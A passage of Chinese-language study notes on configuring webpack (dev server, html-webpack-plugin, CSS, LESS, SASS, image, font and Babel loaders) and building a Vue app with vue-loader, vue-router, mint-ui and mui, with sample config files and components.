2.由于运行webpack命令的时候，webpack需要指定入口文件和输出文件的路径，所以，我们需要在webpack.config.js中配置这两个路径：
    // 导入处理路径的模块

    var path = require('path');

 
    // 导出一个配置对象，将来webpack在启动的时候，会默认来查找webpack.config.js，并读取这个文件中导出的配置对象，来进行打包处理

    module.exports = {

        entry: path.resolve(__dirname, 'src/js/main.js'), // 项目入口文件

        output: { // 配置输出选项

            path: path.resolve(__dirname, 'dist'), // 配置输出的路径

            filename: 'bundle.js' // 配置输出的文件名

        }

    }
3.上面参数的具体讲解entry 要打包文件的目录，output将打包文件生成存放
的位置，其中path 打包文件的目录filename输出的文件的名称
```
>[success] # 总结步骤
* 目录
![](https://box.kancloud.cn/e4176fe544e7a42d725d2a46d74c8f3d_241x232.png)
*总结步骤
```
1.生成package.json配置文件 指令 -- nmp init -y
2.安装 webpack 指令 --  npm i webpack -g全局安装    / npm i webpack --save-dev安装到项目依赖中
2.如果使用webpack4 还需安装cli 指令 -- npm i webpack-cli -g
3.安装jquery 指令 -- npm i jquery --save 
4.在项目根目录中创建webpack.config.js,配置要打包的文件和被打包文件的位置
   // 导入处理路径的模块
    var path = require('path');
    // 导出一个配置对象，将来webpack在启动的时候，会默认来查找webpack.config.js，并读取这个文件中导出的配置对象，来进行打包处理
    module.exports = {
        entry: path.join(__dirname, './src/main.js'), // 项目入口文件
        output: { // 配置输出选项
            path: path.join(__dirname, './dist'), // 配置输出的路径
            filename: 'bundle.js' // 配置输出的文件名
        }
    }
5.运行配置文件webpack.config.js 输入webpack
```
>[danger] ##### 对main.js 文件做说明
```
// 1. 导入 Jquery
// import *** from *** 是ES6中导入模块的方式
// 由于 ES6的代码，太高级了，浏览器解析不了，所以，这一行执行会报错
import $ from 'jquery'
// 和上面导入类似因为node会优先去node_modules 模块去找包 const $ = require('jquery')
$(function () {
    $('ul li:odd').css('background','green');
    $('ul li:odd').css('background',function () {
        return "red"
    });
})
```
>[success] # 实现webpack的实时打包构建
```
1.由于每次重新修改代码之后，都需要手动运行webpack打包的命令，比较
麻烦，所以使用webpack-dev-server来实现代码实时打包编译，当修改代码
之后，会自动进行打包构建。
```
>[danger] ##### 安装 -- webpack-dev-server
```
1.运行cnpm i webpack-dev-server --save-dev安装到开发依赖
2.安装后在package.json的scripts节点下新增"dev": "webpack-dev-server"指令。
3.运行 输入npm run dev ，这就是一个快速启动刚才配置的名称指令
4.运行后会自动监听端口形成一个服务器，运行页面，因此可以继续在package.json 继续配置
在scripts的节点下dev配置"webpack-dev-server --open --port 3000 --contentBase src --hot"
5.除了在package.json配置也可以在webpack.config.js，但建议直接在sprict节点配置：
    devServer: { // 这是配置 dev-server 命令参数的第二种形式，相对来说，这种方式麻烦一些
        //  --open --port 3000 --contentBase src --hot
        open: true, // 自动打开浏览器
        port: 3000, // 设置启动时候的运行端口
        contentBase: 'src', // 指定托管的根目录
        hot: true // 启用热更新 的 第1步
      },
6.注意在这里配置webpack-dev-server 的hot 需求要三步具体见下面
7.  当使用 html-webpack-plugin 之后，我们不再需要手动处理 bundle.js 的引用路径
了，因为 这个插件，已经帮我们自动 创建了一个 合适的 script , 并且，引用了 正确的路径 就是直接根路径/bundle.js

```
```
const path = require('path')
// 启用热更新的 第2步
const webpack = require('webpack')

// 这个配置文件，起始就是一个 JS 文件，通过 Node 中的模块操作，向外暴露了一个 配置对象
module.exports = {
    // 大家已经学会了举一反4， 大家觉得，在配置文件中，需要手动指定 入口 和 出口
    entry: path.join(__dirname, './src/main.js'),// 入口，表示，要使用 webpack 打包哪个文件
    output: { // 输出文件相关的配置
        path: path.join(__dirname, './dist'), // 指定 打包好的文件，输出到哪个目录中去
        filename: 'bundle.js' // 这是指定 输出的文件的名称
    },
    devServer: { // 这是配置 dev-server 命令参数的第二种形式，相对来说，这种方式麻烦一些
        //  --open --port 3000 --contentBase src --hot
        open: true, // 自动打开浏览器
        port: 3000, // 设置启动时候的运行端口
        contentBase: 'src', // 指定托管的根目录
        hot: true // 启用热更新 的 第1步
    },
    plugins: [ // 配置插件的节点
        new webpack.HotModuleReplacementPlugin(), // new 一个热更新的 模块对象， 这是 启用热更新的第 3 步

    ],
}
```
>[success] # 在内存生成html -- html-webpack-plugin
```
1. 自动在内存中根据指定页面生成一个内存的页面
2. 自动，把打包好的 bundle.js 追加到页面中去
3. 将index.html中script标签注释掉，因为html-webpack-plugin插件会自动把bundle.js注入到index.html页面中！
```
>[danger] ##### 安装方法
```
1.cnpm i html-webpack-plugin --save-dev
```
>[danger] ##### 安装后配置webpack.config.js
```
    // 导入处理路径的模块

    var path = require('path');

    // 导入自动生成HTMl文件的插件

    var htmlWebpackPlugin = require('html-webpack-plugin');



    module.exports = {

        entry: path.join(__dirname, 'src/js/main.js'), // 项目入口文件

        output: { // 配置输出选项

            path: path.join(__dirname, 'dist'), // 配置输出的路径

            filename: 'bundle.js' // 配置输出的文件名

        },

        plugins:[ // 添加plugins节点配置插件

            new htmlWebpackPlugin({

                template:path.join(__dirname, 'src/index.html'),//模板路径

                filename:'index.html'//自动生成的HTML文件的名称

            })

        ]

    }
```
>[success] # 处理css
```
1. 因为webpack基于node, 默认只能打包处理 JS 类型的文件，无法处理 其它的非 JS 类型的文件；
2.如果要处理 非JS类型的文件，我们需要手动安装一些 合适 第三方 loader 加载器；
 2.1. 如果想要打包处理 css 文件，需要安装 cnpm i style-loader css-loader -D
 2.2 打开 webpack.config.js 这个配置文件，在 里面，新增一个 配置节点，叫做 module, 它是一个对象；在 这个 module 对象身上，有个 rules 属性，这个 rules 属性是个 数组；这个数组中，存放了，所有第三方文件的 匹配和 处理规则；
```
>[danger] ##### 安装处理css文件lodar
```
 npm i style-loader css-loader -D
```
>[danger] ##### 处理less
```
npm i less-loader less -D
```
>[danger] ##### 处理sass
```
npm i sass-loader node-sass --save-dev
```
>[danger] ##### 具体配置
```
// 使用 import 语法，导入 CSS样式表指定css 文件目录，导入是在main.js
import './css/index.css'
import './css/index.less'
import './css/index.scss'


// 配置是在webpack.config.js
  module: { // 这个节点，用于配置 所有 第三方模块 加载器 
    rules: [ // 所有第三方模块的 匹配规则
      { test: /\.css$/, use: ['style-loader', 'css-loader'] }, //  配置处理 .css 文件的第三方loader 规则
      { test: /\.less$/, use: ['style-loader', 'css-loader', 'less-loader'] }, //配置处理 .less 文件的第三方 loader 规则
      { test: /\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader'] }, // 配置处理 .scss 文件的 第三方 loader 规则
    ]
  }
```
>[success] # 可以在css中引入background地址或者字体文件
```
1.处理 在backgroud 引入的地址文件
```
>[danger] ##### 下载 -- url-loader file-loader
```
1.npm i url-loader file-loader --save-dev
```
>[danger] ##### 在webpack.config.js 下配置
```
1.limit 给定的值，是图片的大小，单位是 byte， 如果我们引用的 图片，大
于或等于给定的 limit值，则不会被转为base64格式的字符串， 如果 图片小
于给定的 limit 值，则会被转为 base64的字符串
2.name=[hash:8]-[name].[ext],使用图片原名称，其中hash:8 是使用hash八位防止名称重复，name使用原名称，ext 使用原来后缀
```
```
// 在webpack.config.js 下配置 module 节点的rules 对象中配置对应匹配规则
{ test: /\.(jpg|png|gif|bmp|jpeg)$/, use: 'url-loader?limit=7631&name=[hash:8]-[name].[ext]' }, // 处理 图片路径的 loader
{ test: /\.(ttf|eot|svg|woff|woff2)$/, use: 'url-loader' }, // 处理 字体文件的 loader 

```
>[success] # 把js 高级语法es6 转成低级语法
```
1. 在 webpack 中，默认只能处理 一部分 ES6 的新语法，一些更高级的ES6语法
或者 ES7 语法，webpack 是处理不了的；这时候，就需要 借助于第三方的 
loader，来帮助webpack 处理这些高级的语法，当第三方loader 把 高级语法转为 
低级的语法之后，会把结果交给 webpack 去打包到 bundle.js 中
2.通过 Babel ，可以帮我们将 高级的语法转换为 低级的语法
3.目前，我们安装的 babel-preset-env, 是比较新的ES语法， 之前， 我们安装的是 babel-preset-es2015, 现在，出了一个更新的 语法插件，叫做 babel-preset-env ，它包含了 所有的 和 es***相关的语法

```
>[danger] ##### 安装包
```
// 一下方法只支持npm install -D babel-loader@7 babel-core babel-preset-env

1.cn pm i babel-core babel-loader babel-plugin-transform-runtime -D
2.cnpm i babel-preset-env babel-preset-stage-0 -D
```
>[danger] ##### 在webpack.config.js 怎加配置语句
```
1. 注意： 在配置 babel 的 loader规则的时候，必须 把 node_modules 目录，通过 exclude 选项排除掉：原因有俩：
2. 如果 不排除 node_modules， 则Babel 会把 node_modules 中所有的 第三方 JS 文件，都打包编译，这样，会非常消耗CPU，同时，打包速度非常慢；
3. 哪怕，最终，Babel 把 所有 node_modules 中的JS转换完毕了，但是，项目也无法正常运行！
```
```
 { test:/\.js$/, use: 'babel-loader', exclude:/node_modules/ }
```
>[danger] ##### 在根目录创建.babelrc文件进行配置
```
1.在项目的 根目录中，新建一个 叫做 .babelrc  的Babel 配置文件，这个配置文件，属于JSON格式，所以，在写 .babelrc 配置的时候，必须符合JSON语法规范： 不能写注释，字符串必须用双引号
```
```
 {
         "presets": ["env", "stage-0"],
          "plugins": ["transform-runtime"]
   }
```
```
// 由于 webpack 是基于Node进行构建的，所有，webpack的配置文件中，任何合法的Node代码都是支持的
var path = require('path')
// 在内存中，根据指定的模板页面，生成一份内存中的首页，同时自动把打包好的bundle注入到页面底部
// 如果要配置插件，需要在导出的对象中，挂载一个 plugins 节点
var htmlWebpackPlugin = require('html-webpack-plugin')

// 当以命令行形式运行 webpack 或 webpack-dev-server 的时候，工具会发现，我们并没有提供 要打包 的文件的 入口 和 出口文件，此时，他会检查项目根目录中的配置文件，并读取这个文件，就拿到了导出的这个 配置对象，然后根据这个对象，进行打包构建
module.exports = {
  entry: path.join(__dirname, './src/main.js'), // 入口文件
  output: { // 指定输出选项
    path: path.join(__dirname, './dist'), // 输出路径
    filename: 'bundle.js' // 指定输出文件的名称
  },
  plugins: [ // 所有webpack  插件的配置节点
    new htmlWebpackPlugin({
      template: path.join(__dirname, './src/index.html'), // 指定模板文件路径
      filename: 'index.html' // 设置生成的内存页面的名称
    })
  ],
  module: { // 配置所有第三方loader 模块的
    rules: [ // 第三方模块的匹配规则
      { test: /\.css$/, use: ['style-loader', 'css-loader'] }, // 处理 CSS 文件的 loader
      { test: /\.less$/, use: ['style-loader', 'css-loader', 'less-loader'] }, // 处理 less 文件的 loader
      { test: /\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader'] }, // 处理 scss 文件的 loader
      { test: /\.(jpg|png|gif|bmp|jpeg)$/, use: 'url-loader?limit=7631&name=[hash:8]-[name].[ext]' }, // 处理 图片路径的 loader
      // limit 给定的值，是图片的大小，单位是 byte， 如果我们引用的 图片，大于或等于给定的 limit值，则不会被转为base64格式的字符串， 如果 图片小于给定的 limit 值，则会被转为 base64的字符串
      { test: /\.(ttf|eot|svg|woff|woff2)$/, use: 'url-loader' }, // 处理 字体文件的 loader 
      { test: /\.js$/, use: 'babel-loader', exclude: /node_modules/ }, // 配置 Babel 来转换高级的ES语法
    ]
  }
}
```
```
{
  "name": "webpack-study",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "dev2": "webpack-dev-server --open --port 3000 --contentBase src --hot",
    "dev": "webpack-dev-server"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "jquery": "^3.2.1"
  },
  "devDependencies": {
    "css-loader": "^0.28.7",
    "html-webpack-plugin": "^2.30.1",
    "less": "^2.7.3",
    "less-loader": "^4.0.5",
    "node-sass": "^4.5.3",
    "sass-loader": "^6.0.6",
    "style-loader": "^0.19.0",
    "webpack": "^3.8.1",
    "webpack-dev-server": "^2.9.3"
  }
}

```
>[success] # 在webpack使用Vue
```
1.首先根据上面的webpack 进行配置后
2.现在vue包npm i vue -S
```
>[danger] ##### 第一步导入Vue
```
1.在要编辑的js文件中导入vue  import Vue from 'vue'
2.根据node 的包查找规则
 2.1. 找 项目根目录中有没有 node_modules 的文件夹
 2.2. 在 node_modules 中 根据包名，找对应的 vue 文件夹
 2.3. 在 vue 文件夹中，找 一个叫做 package.json 的包配置文件
 2.4. 在 package.json 文件中，查找 一个 main 属性【main属性指定了这个包在被加载时候，的入口文件】
3.根据上面的查找规则在vue在main属性中的入口文件不是功能完整的文件，
导入的 Vue 构造函数，功能不完整，只提供了 runtime-only 的方式，并没有
提供 像网页中那样的使用方式
4.因此解决方法有三种：
    4.1 改变main 参数的入口文件地址改成vue.js
    4.2 导入使用地址方式的引入，明确具体文件import Vue from '../node_modules/vue/dist/vue.js'
    4.3在webpack.config.js 文件中配置节点点引入
         resolve: {
            alias: { // 修改 Vue 被导入时候的包的路径
              "vue$": "vue/dist/vue.js"
            }
         }
```
* 案例中使用的是第三种在要被转译的js代码如下，也就是main.js
```
// import Vue from 'vue'
import Vue from '../node_modules/vue/dist/vue.js'

// 网页的形式创建组件
var login={
    template:"<h1>按照网页形式创建的自定义组件</h1>"
}

var vm = new Vue({
    el:"#app",
    data:{
        msg:"123"
    },
    components:{
      login
    }
})
```
>[success] # 在webpack 组件抽离形式创建
```
1.上面的案例组件和创建的vue都在一起，这样对以后抽离组件有一定问题影响
2.因此在webpack使用抽离组件化开发模式，创建对应以vue结尾的组件，引入使用
3.默认，webpack 无法打包 .vue 文件，需要安装 相关的loader，node默认
支持js 文件类型，因此编译css 等文件都需要相关的loader 包 
```
>[danger] ##### 安装可以编译vue的包 -- vue-loader

```
1.在vue-loader 15的版本需要在webpack.config.js 进行额外配置，见下面连接
https://vue-loader.vuejs.org/migrating.html#a-plugin-is-now-required
```
```
1.cnpm i vue-loader vue-template-compiler -D // 这里安装了两个包因为vue-loader 依赖vue-template-compiler 所以安装两个
```
>[danger] ##### 安装后在对应的webpack.config.js配置
```
1.在webpack.config.js 的module节点下rules数组配置是哪个vue的编译规则
{ test: /\.vue$/, use: 'vue-loader' } // 处理 .vue 文件的 loader
```
>[danger] ##### 直接引入vue
```
1.如果在main.js 转换js文件中直接引入import Vue from 'vue' ，那么组件的
渲染 需要用render 来渲染
```
```
import Vue from 'vue'
import login from './login.vue'

var vm = new Vue({
    el:"#app",
    data:{
        msg:"123"
    },
    /* render: function (createElements) { // 在 webpack 中，如果想要通过 vue， 把一个组件放到页面中去展示，vm 实例中的 render 函数可以实现
       return createElements(login)
     } */

    // 缩写
    render: c => c(login)
})
```
>[danger] ##### 如果引入的是最全的vue 可以使用component引入
```
1.注意render 和compent 的区别，两者前者会覆盖整标签的内容，后者不会
```
```
import Vue from '../node_modules/vue/dist/vue.js'
import login from './login.vue'

var vm = new Vue({
    el:"#app",
    data:{
        msg:"123"
    },
    components:{
            login
    }
})
```
>[danger] ##### 创建的组件讲解login.vue
* module.exports 和 exports 来暴露成员
```
1.在 Node 中向外暴露单个成员的形式：module.exports = {} / 多个exprots.的形式=值
2.在 ES6中，也通过 规范的形式，规定了 ES6 中如何 导入 和 导出 模块
ES6中导入模块，使用   import 模块名称 from '模块标识符'    import '表示路径'
3.在 ES6 中，使用 export default 和 export 向外暴露单个成员：
    var info = {
      name: 'zs',
      age: 20
    }
    
    export default info

/* export default {
  address: '北京'
} */
// 注意： export default 向外暴露的成员，可以使用任意的变量来接收
// 注意： 在一个模块中，export default 只允许向外暴露1次
// 注意： 在一个模块中，可以同时使用 export default 和 export 向外暴露成员

4.暴露多个成员export  var 变量 = 值
export var title = '小星星'
export var content = '哈哈哈'

// 注意： 使用 export 向外暴露的成员，只能使用 { } 的形式来接收，这种形式，叫做 【按需导出】
// 注意： export 可以向外暴露多个成员， 同时，如果某些成员，我们在 import 的时候，不需要，则可以 不在 {}  中定义
// 注意： 使用 export 导出的成员，必须严格按照 导出时候的名称，来使用  {}  按需接收；
// 注意： 使用 export 导出的成员，如果 就想 换个 名称来接收，可以使用 as 来起别名；
import m222, { title as title123, content } from './test.js'

```
* 创建的组件 一下三部分为一个主体
```
1.组件vue-loader会把这三部分整合在一起
2.使用export default把组件对象暴露出去
```
```
<template>
  <div>
    <h1>这是登录组件，使用 .vue 文件定义出来的 --- {{msg}}</h1>
  </div>
</template>

<script>
export default {
  data() {
    // 注意：组件中的 data 必须是 function
    return {
      msg: "123"
    };
  },
  methods: {
    show() {
      console.log("调用了 login.vue 中的 show 方法");
    }
  }
};
</script>

<style>

</style>

```
>[success] # webpack 配合路由 -- vue-router
![](https://box.kancloud.cn/69845ccfd38026c48d9581189a545937_246x319.png)
* 安装
```
1.npm install vue-router
```
>[danger] ##### 引入路由 -- main.js
```
1.在src下创建了main 用来封装 Account.vue和GoodsList.vue 两个组件
2.在main.js 用import 导入连个模块
3.导入vue-router
 模块，对这个两个模块做路由
4.用render 的方法 创建最入口login.vue 文件
5.在login.vue 导入两个main文件夹中的模板
```
```
import Vue from 'vue'
// 1. 导入 vue-router 包
import VueRouter from 'vue-router'
// 2. 手动安装 VueRouter 
Vue.use(VueRouter)

// 导入 app 组件
import app from './App.vue'
// 导入 Account 组件
import account from './main/Account.vue'
import goodslist from './main/GoodsList.vue'

// 3. 创建路由对象
var router = new VueRouter({
  routes: [
    // account  goodslist
    { path: '/account', component: account },
    { path: '/goodslist', component: goodslist }
  ]
})

var vm = new Vue({
  el: '#app',
  render: c => c(app), // render 会把 el 指定的容器中，所有的内容都清空覆盖，所以 不要 把 路由的 router-view 和 router-link 直接写到 el 所控制的元素中
  router // 4. 将路由对象挂载到 vm 上
})

// 注意： App 这个组件，是通过 VM 实例的 render 函数，渲染出来的， render 函数如果要渲染 组件， 渲染出来的组件，只能放到 el: '#app' 所指定的 元素中；
// Account 和 GoodsList 组件， 是通过 路由匹配监听到的，所以， 这两个组件，只能展示到 属于 路由的 <router-view></router-view> 中去；
```
* login.vue
```
<template>
    <div>
        <h1>这是登录组件，使用 .vue 文件定义出来的 --- {{msg}}</h1>
        <router-link to="/account" tag="span">登录</router-link>
        <router-link to="/goodslist">注册</router-link>
        <router-view></router-view>

    </div>
</template>

<script>

</script>

<style lang="scss" scoped>
/* 普通的 style 标签只支持 普通的 样式，如果想要启用 scss 或 less ，需要为 style 元素，设置 lang 属性 */
// 只要 咱们的 style 标签， 是在 .vue 组件中定义的，那么，推荐都为 style 开启 scoped 属性
body {
  div {
    font-style: italic;
  }
}
</style>

```
>[success] # 最后的结构
![](https://box.kancloud.cn/bc80d435006ae14c1283675c6340d976_261x363.png)
>[danger] ##### 抽离的router.js
```
import VueRouter from 'vue-router'

// 导入 Account 组件
import account from './main/Account.vue'
import goodslist from './main/GoodsList.vue'

// 导入Account的两个子组件
import login from './subcom/login.vue'
import register from './subcom/register.vue'

// 3. 创建路由对象
var router = new VueRouter({
  routes: [
    // account  goodslist
    {
      path: '/account',
      component: account,
      children: [
        { path: 'login', component: login },
        { path: 'register', component: register }
      ]
    },
    { path: '/goodslist', component: goodslist }
  ]
})

// 把路由对象暴露出去
export default router
```
>[danger] ##### 总结
```
1.在main.js 带编译js 中创建vue实例对象，使用render 渲染总的组件
2.路由负责 处理个个组件，单个组件可以依靠路由委托在总组件中
```
![](https://box.kancloud.cn/cab87bde722fadadedd7d9145992adc4_808x560.png)
```
var path = require('path')
var htmlWebpackPlugin = require('html-webpack-plugin');
const VueLoaderPlugin = require('vue-loader/lib/plugin')


module.exports = {
    entry:path.join(__dirname,'/src/main.js'),
    output:{
        path:path.join(__dirname,'/dist'),
        filename:'bundle.js'
    },
    plugins:[ // 添加plugins节点配置插件
        new VueLoaderPlugin(),

        new htmlWebpackPlugin({

            template:path.join(__dirname, 'src/index.html'),//模板路径

            filename:'index.html'//自动生成的HTML文件的名称

        })
    ],
    module: { // 这个节点，用于配置 所有 第三方模块 加载器
        rules: [ // 所有第三方模块的 匹配规则
            { test: /\.css$/, use: ['style-loader', 'css-loader'] }, //  配置处理 .css 文件的第三方loader 规则
            { test: /\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader'] }, // 配置处理 .scss 文件的 第三方 loader 规则
            { test: /\.(png|jpg|gif)$/, use: 'url-loader' },
            { test: /\.(ttf|eot|svg|woff|woff2)$/, use: 'url-loader' }, // 处理 字体文件的 loader
            { test: /\.vue$/, use: 'vue-loader' } ,// 处理 .vue 文件的 loader
        ]
    },
    resolve: {
        alias: { // 修改 Vue 被导入时候的包的路径
             // "vue$": "vue/dist/vue.js"
        }
    },
    mode: 'development' // 设置mode

}
```
>[success] # VUE 案例
```
1.vue 组件方面使用的是mint-ui
2.移动端组件方面使用的是miu
```
>[success] # mint-ui 基本介绍
```
1.是一个vue组件
```
>[danger] ##### 安装 mint-ui 组件库
```
1.npm i mint-ui -S
```
>[danger] ##### 基本配置-- 导入全局组件
```
// 导入对应的mint-ui 和css样式
import MintUI from 'mint-ui'
import 'mint-ui/lib/style.css'
// 使用 注册mintUI 组件变成全局组件
Vue.use(MintUI)
```
>[danger] ##### 使用提供的-- css 组件
```
1.css 组件可以直接在页面显示复制粘贴即可使用
```
>[danger] ##### 使用提供的 -- js 组件
* 效果图 想更改效果样式可以直接在默认样式重新配置样式
![](https://box.kancloud.cn/b4a6812bf7bf72d6bb9630e3c26719de_201x182.png)
```
1.以js 组件Toast 为例，使用的时候在<sprict> 处调用
    import { Toast } from "mint-ui";
2.在配置第三方图片iconClass 属性的时候可以引入第三方字体库在main.js
中例如引入bootstrap import 'bootstrap/dist/css/bootstrap.css'
3.下面的toast 组件提供返回值，当返回值调用close方法会关闭toast组件，为了接受返回值在data出设置了接受返回值的参数
```
```
<template>
  <div>
    <h1>这是 App 组件</h1>
    <mt-button type="danger" icon="more" @click="show">default</mt-button>
  </div>
</template>

<script>
// 按需导入 Toast 组件
import { Toast } from "mint-ui";

export default {
  data() {
    return {
      toastInstanse: null
    };
  },
  created() {
    this.getList();
  },
  methods: {
    getList() {
      // 模拟获取列表的 一个 AJax 方法
      // 在获取数据之前，立即 弹出 Toast 提示用户，正在加载数据
      this.show();
      setTimeout(() => {
        //  当 3 秒过后，数据获取回来了，要把 Toast 移除
        this.toastInstanse.close();
      }, 3000);
    },
    show() {
      // Toast("提示信息");
      this.toastInstanse = Toast({
        message: "这是消息",
        duration: -1, // 如果是 -1 则弹出之后不消失
        position: "top",
        iconClass: "glyphicon glyphicon-heart", // 设置 图标的类
        className: "mytoast" // 自定义Toast的样式，需要自己提供一个类名
      });
    }
  }
};
</script>
   
<style>
</style>
```
>[danger] ##### 减少文件体积，根据使用导入Toast 组件
```
1.Toast 所有组件不可能全部使用，可以在.babelrc做配置，
2.在mian.js使用做调整
```
* 在babelrc 做的配置
```
["component", [
    {
      "libraryName": "mint-ui",
      "style": true
    }
  ]]
```
* 在main.js 引入方式更改
```
// 当想使用button 的css 样式的时候可以这么引入使用，单独注册使用
import { Button } from 'mint-ui';
Vue.component(Button.name, Button);
```
>[success] # 使用miu
```
1.去官网下载miu文件包
2.下载后主要使用dist中的引入
3.观看使用的案例在examples 文件夹
```
![](https://box.kancloud.cn/d1201e15dce76bcfd2ddd9d8007ba565_634x369.png)
>[success] # 基本配置
![](https://box.kancloud.cn/41612b3b84e28055d4efa12e4627655c_325x317.png)
>[danger] ##### package.json
```
{
  "name": "01.webpack-study",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "dev": "webpack-dev-server --open --port 3000 --hot"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "devDependencies": {
    "babel-core": "^6.26.0",
    "babel-loader": "^7.1.2",
    "babel-plugin-component": "^0.10.1",
    "babel-plugin-transform-runtime": "^6.23.0",
    "babel-preset-env": "^1.6.1",
    "babel-preset-stage-0": "^6.24.1",
    "css-loader": "^0.28.7",
    "file-loader": "^1.1.5",
    "html-webpack-plugin": "^2.30.1",
    "less": "^2.7.3",
    "less-loader": "^4.0.5",
    "node-sass": "^4.5.3",
    "sass-loader": "^6.0.6",
    "style-loader": "^0.19.0",
    "url-loader": "^0.6.2",
    "vue-loader": "^13.3.0",
    "vue-template-compiler": "^2.5.2",
    "webpack": "^3.8.1",
    "webpack-dev-server": "^2.9.3"
  },
  "dependencies": {
    "bootstrap": "^3.3.7",
    "mint-ui": "^2.2.9",
    "vue": "^2.5.2",
    "vue-router": "^3.0.1"
  }
}

```
>[danger] ##### webpack.config.js
```
// 由于 webpack 是基于Node进行构建的，所有，webpack的配置文件中，任何合法的Node代码都是支持的
var path = require('path')
// 在内存中，根据指定的模板页面，生成一份内存中的首页，同时自动把打包好的bundle注入到页面底部
// 如果要配置插件，需要在导出的对象中，挂载一个 plugins 节点
var htmlWebpackPlugin = require('html-webpack-plugin')

// 当以命令行形式运行 webpack 或 webpack-dev-server 的时候，工具会发现，我们并没有提供 要打包 的文件的 入口 和 出口文件，此时，他会检查项目根目录中的配置文件，并读取这个文件，就拿到了导出的这个 配置对象，然后根据这个对象，进行打包构建
module.exports = {
  entry: path.join(__dirname, './src/main.js'), // 入口文件
  output: { // 指定输出选项
    path: path.join(__dirname, './dist'), // 输出路径
    filename: 'bundle.js' // 指定输出文件的名称
  },
  plugins: [ // 所有webpack  插件的配置节点
    new htmlWebpackPlugin({
      template: path.join(__dirname, './src/index.html'), // 指定模板文件路径
      filename: 'index.html' // 设置生成的内存页面的名称
    })
  ],
  module: { // 配置所有第三方loader 模块的
    rules: [ // 第三方模块的匹配规则
      { test: /\.css$/, use: ['style-loader', 'css-loader'] }, // 处理 CSS 文件的 loader
      { test: /\.less$/, use: ['style-loader', 'css-loader', 'less-loader'] }, // 处理 less 文件的 loader
      { test: /\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader'] }, // 处理 scss 文件的 loader
      { test: /\.(jpg|png|gif|bmp|jpeg)$/, use: 'url-loader?limit=7631&name=[hash:8]-[name].[ext]' }, // 处理 图片路径的 loader
      // limit 给定的值，是图片的大小，单位是 byte， 如果我们引用的 图片，大于或等于给定的 limit值，则不会被转为base64格式的字符串， 如果 图片小于给定的 limit 值，则会被转为 base64的字符串
      { test: /\.(ttf|eot|svg|woff|woff2)$/, use: 'url-loader' }, // 处理 字体文件的 loader 
      { test: /\.js$/, use: 'babel-loader', exclude: /node_modules/ }, // 配置 Babel 来转换高级的ES语法
      { test: /\.vue$/, use: 'vue-loader' } // 处理 .vue 文件的 loader
    ]
  },
  resolve: {
    alias: { // 修改 Vue 被导入时候的包的路径
      // "vue$": "vue/dist/vue.js"
    }
  }
}
```
>[danger] ##### .babelrc 配置
```
{
  "presets": ["env", "stage-0"],
  "plugins": ["transform-runtime", ["component", [
    {
      "libraryName": "mint-ui",
      "style": true
    }
  ]]]
}
```
>[danger] ##### router.js
```
import VueRouter from 'vue-router'


// 3. 创建路由对象
var router = new VueRouter({
  routes: [
  ]
})

// 把路由对象暴露出去
export default router
```
>[success] # 路由组件配置
```
1.用到的mint 组件，mui样式组件
2.使用mui 样式组件的时候，dist是工程使用的js/css 等目录
3.观看mui 样式组件例子的文件夹examples
```
* 知识点
```
1.
```
![](https://box.kancloud.cn/485a4e11feeccd2810bd942c94e8dadc_564x538.png)
* 目录
![](https://box.kancloud.cn/972188f6b3be934456576b77f64c886a_253x381.png)
>[danger] ##### main.js
```
1.在main.js 中安装路由，也就是要用Vue.use(VueRouter)，安装路由
2.使用第三方vue的组件的时候，一定要导入第三方组件，一般导入组件和样式两种
import MintUI from 'mint-ui'/import 'mint-ui/lib/style.css'
3.当我们使用一些非vue组件，一些ui样式的时候，我们将这种无法下载npm的组件放在
第三方包中起名lib，也要引入对应的样式import './lib/mui/css/mui.min.css'
4.这次使用的mui 组件中提供了扩展字体，往往这些扩展包不在随目录下载的dist文件中
，需要手动找到并且引入，注意字体包也需要引入对应ttf 文件才可以，例如扩展的第三方字体导入import './lib/mui/css/icons-extra.css'
5.配置vue 的ajax 组件，第一安装后导入组件import VueResource from 'vue-resource'，
第二步安装组件Vue.use(VueResource)，第三步配置组件=
// 设置请求的根路径
Vue.http.options.root = 'http://vue.studyit.io';
// 全局设置 post 时候表单数据格式组织形式   application/x-www-form-urlencoded
Vue.http.options.emulateJSON = true;
```
```
// 导入vue 导入Vuerouter 路由文件,导入router 异步请求
import Vue from 'vue'
import VueRouter from 'vue-router'
import VueResource from 'vue-resource'


// 导入mui样式,和字体扩展库
import './lib/mui/css/mui.min.css'
import './lib/mui/css/icons-extra.css'

// 导入mint 组件头部样式，轮播图组件
import { Header, Swipe, SwipeItem } from 'mint-ui';

// 导入组件入口app文件
import app from './App.vue'
import router from './router.js'

// 使用 路由
Vue.use(VueRouter)
Vue.use(VueResource)
// 设置请求的根路径
Vue.http.options.root = 'http://www.liulongbin.top:3005';
// 全局设置 post 时候表单数据格式组织形式   application/x-www-form-urlencoded
Vue.http.options.emulateJSON = true;

// 使用从 mint ui引入的头部组件
Vue.component(Header.name, Header);
// 注册轮播图
Vue.component(Swipe.name, Swipe);
Vue.component(SwipeItem.name, SwipeItem);

var vm = new Vue({
    el:"#app",
    data:{},
    render(c){
        return c(app)
    },
    router// 挂在路由到vue实例上
})
```
>[danger] ##### 路由 -- router.js
```
1.这个案例中的底部导航栏，根据点击变色的原理，router-link 有一个根据点击产生样式
的class名也可以直接指定在配置router 文件的时候，只要确定好mui负责样式的名称，即
可与其指定，完成点击按钮出现点击效果
```
```
// vue-router 路由 各部分组件
import VueRouter from 'vue-router'
import HomeContainer from './compents/tabbar/HomeContainer.vue'
import MemberContainer from './compents/tabbar/MemberContainer.vue'
import ShopcarContainer from './compents/tabbar/ShopcarContainer.vue'
import SearchContainer from './compents/tabbar/SearchContainer.vue'

// 3. 创建路由对象
var router = new VueRouter({
  routes: [// 配置路由规则
      { path: '/', redirect: '/home' },
      {path:"/home",component:HomeContainer},
      {path:"/member",component:MemberContainer},
      {path:"/shop",component:ShopcarContainer},
